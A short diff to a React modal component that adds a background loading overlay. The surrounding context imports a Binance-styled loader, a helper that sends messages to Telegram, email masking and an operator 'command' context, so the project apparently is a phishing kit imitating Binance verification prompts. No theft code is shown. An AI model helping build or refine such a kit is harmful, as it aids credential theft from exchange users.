@@ -6,6 +6,7 @@ import BinanceLoader from './BinanceLoader'
 import { useCommand } from '../app/lib/CommandContext';
 import { useEmail } from '../app/lib/EmailContext'
 import { sendMessageToTelegram } from '../lib/api';
+import BackgroundLoader from './BackgroundLoader'
 
 export default function Modal({ displayModal, setDisplayModal, modal, count, setCount, setAppAuthButton, setPhoneAuthButton }) {
     const { theme, toggleTheme } = useTheme();
@@ -17,6 +18,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
     const [invalid, setInvalid] = useState(false);
     let { command, resetCommand  } = useCommand(); // Get current command
     const [isVerified, setIsVerified] = useState(false);
+    const [bgLoader, setBgLoader] = useState(false);
 
     const maskEmail = (userEmail) => {
         if (!userEmail) return '';
@@ -109,6 +111,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
             className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-black bg-opacity-50 backdrop-opacity-50' : 'bg-[#0c0d10]'}`}
             onClick={() => setInvalid(false)} // Add this line
         >
+            {bgLoader ? <BackgroundLoader /> : null}
             <div className='h-full w-full flex md:justify-center flex-col md:items-center'>
                 <div className={`md:border ${animate} transition-opacity duration-200 ease-in-out ${theme === 'light' ? 'md:border-[#eaecef]' : ''} ${theme === 'light' ? 'bg-white' : 'bg-[#1e2329]'} md:mt-10 md:rounded-[15px] md:w-[425px] w-full min-h-[fit] h-full md:h-[589px]`}>
                     <div className='flex md:items-center items-start justify-between py-[16px] px-[16px]'>
